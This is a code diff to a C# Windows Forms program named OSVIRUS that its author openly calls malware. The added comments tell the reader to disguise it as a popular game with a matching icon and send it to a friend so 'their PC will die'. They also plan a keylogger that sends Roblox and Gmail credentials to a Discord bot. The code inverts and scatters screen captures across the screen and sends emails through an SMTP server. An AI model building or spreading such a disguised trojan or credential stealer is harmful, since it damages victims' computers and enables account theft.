@@ -32,6 +32,18 @@ namespace WindowsFormsApp1
         public OSVIRUS()
         {
             InitializeComponent();
+            // Any help on this malware is apreciated.
+            // However i advise not downloading this and using it on your own PC.
+            // If you do download it and you wanna destory someones pc:
+            // Rename it to something convinicing
+            // Like a popular game name and alter the picture to its icon.
+            // Customize then send to a friend
+            // And there PC Will die.
+            // Also im planning on adding a KEY LOGGING SYSTEM.
+            // Which sends it to a discord bot you make in a txt
+            // Like roblox username password
+            // Gmail password and account
+            // More stuff like that so help a guy out please!
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -125,10 +137,25 @@ namespace WindowsFormsApp1
 
             g.CopyFromScreen(xPos, yPos, 0, 0, new Size(endWidth, endWidth));
             var Pictur1 = new PictureBox();
+            Pictur1.BackColor = Color.Transparent;
+            Pictur1.Height = 300;
+            Pictur1.Width = 300;
             Pictur1.Location = new Point(r.Next(0, Screen.PrimaryScreen.Bounds.Width),
             r.Next(0, Screen.PrimaryScreen.Bounds.Height));
 
             Controls.Add(Pictur1);
+            Pictur1.Image = bmp;
+            Bitmap pic = new Bitmap(Pictur1.Image);
+            for (int y = 0; (y <= (pic.Height - 1)); y++)
+            {
+                for (int x = 0; (x <= (pic.Width - 1)); x++)
+                {
+                    Color inv = pic.GetPixel(x, y);
+                    inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
+                    pic.SetPixel(x, y, inv);
+                }
+            }
+            Pictur1.Image = pic;
             // The next line of code sends emails and more.
             int mailTime = 5000;
             MailMessage mail = new MailMessage();
@@ -141,6 +168,7 @@ namespace WindowsFormsApp1
             SmtpServer.Port = 587;
             SmtpServer.Credentials = new System.Net.NetworkCredential("ThisGuyGotHAXED!", "dont be stupid!");
             SmtpServer.EnableSsl = true;
+            SmtpServer.SendMailAsync("Hello there this is a hacked email!", "whyareyousosus@gmail.com", "Hacked email sent", "hi");
 
             SmtpServer.Send(mail);
             Console.WriteLine("Send mail!");
